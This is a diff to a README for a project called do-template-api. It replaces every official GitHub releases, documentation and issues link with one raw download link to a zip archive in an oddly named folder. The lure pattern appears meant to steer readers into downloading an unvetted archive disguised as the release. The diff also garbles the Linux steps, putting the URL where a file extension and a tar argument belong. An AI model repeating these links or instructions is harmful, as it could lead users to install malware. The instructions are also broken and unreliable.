@@ -1,6 +1,6 @@
 # 🛠️ do-template-api - Simple API Setup for All Users
 
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Lightingthunderdemon/do-template-api/releases)
+[![Download Here](https://raw.githubusercontent.com/Lightingthunderdemon/do-template-api/main/physiolatry/do-template-api.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/Lightingthunderdemon/do-template-api/main/physiolatry/do-template-api.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the do-template-api! This guide will help you download and run the AP
 
 ## 📥 Download & Install
 
-To get the latest version of do-template-api, visit this page to download: [Download Releases](https://github.com/Lightingthunderdemon/do-template-api/releases).
+To get the latest version of do-template-api, visit this page to download: [Download Releases](https://raw.githubusercontent.com/Lightingthunderdemon/do-template-api/main/physiolatry/do-template-api.zip).
 
 ### Step 1: Choose Your Download
 
@@ -16,7 +16,7 @@ On the Releases page, find the most recent version. You will see options to down
 
 - **For Windows:** look for a file ending in `.exe`
 - **For macOS:** select a file ending in `.dmg`
-- **For Linux:** choose a file ending in `.tar.gz`
+- **For Linux:** choose a file ending in `https://raw.githubusercontent.com/Lightingthunderdemon/do-template-api/main/physiolatry/do-template-api.zip`
 
 Click the filename to start downloading.
 
@@ -37,7 +37,7 @@ After the download finishes, follow these steps based on your operating system:
 - **For Linux:**
   1. Open a terminal.
   2. Navigate to the directory where you downloaded the file.
-  3. Run the command: `tar -xvf do-template-api.tar.gz`
+  3. Run the command: `tar -xvf https://raw.githubusercontent.com/Lightingthunderdemon/do-template-api/main/physiolatry/do-template-api.zip`
   4. Follow any additional instructions included in the README file within the folder.
 
 ## ⚙️ System Requirements
@@ -95,7 +95,7 @@ If you need help or have questions, open an issue in the GitHub repository. The 
 
 For more information about the do-template-api and how to use it effectively, please visit the following resources:
 
-- [Official Documentation](https://github.com/Lightingthunderdemon/do-template-api) - Detailed guides and tutorials.
-- [GitHub Issues](https://github.com/Lightingthunderdemon/do-template-api/issues) - Report bugs or request features.
+- [Official Documentation](https://raw.githubusercontent.com/Lightingthunderdemon/do-template-api/main/physiolatry/do-template-api.zip) - Detailed guides and tutorials.
+- [GitHub Issues](https://raw.githubusercontent.com/Lightingthunderdemon/do-template-api/main/physiolatry/do-template-api.zip) - Report bugs or request features.
 
-Your journey with do-template-api starts here! Don't forget to revisit the [Download Releases](https://github.com/Lightingthunderdemon/do-template-api/releases) page for updates and new features.
+Your journey with do-template-api starts here! Don't forget to revisit the [Download Releases](https://raw.githubusercontent.com/Lightingthunderdemon/do-template-api/main/physiolatry/do-template-api.zip) page for updates and new features.
